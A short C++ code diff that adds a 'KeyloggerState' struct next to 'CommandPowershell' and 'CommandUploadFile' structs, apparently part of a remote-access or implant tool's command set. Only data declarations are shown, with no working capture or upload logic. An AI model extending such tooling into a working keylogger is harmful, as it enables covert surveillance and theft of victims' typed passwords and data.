@@ -27,6 +27,12 @@ struct CommandPowershell
     }
 };
 
+struct KeyloggerState
+{
+    bool isRunning;
+    std::string data;
+};
+
 struct CommandUploadFile
 {
     std::string path;
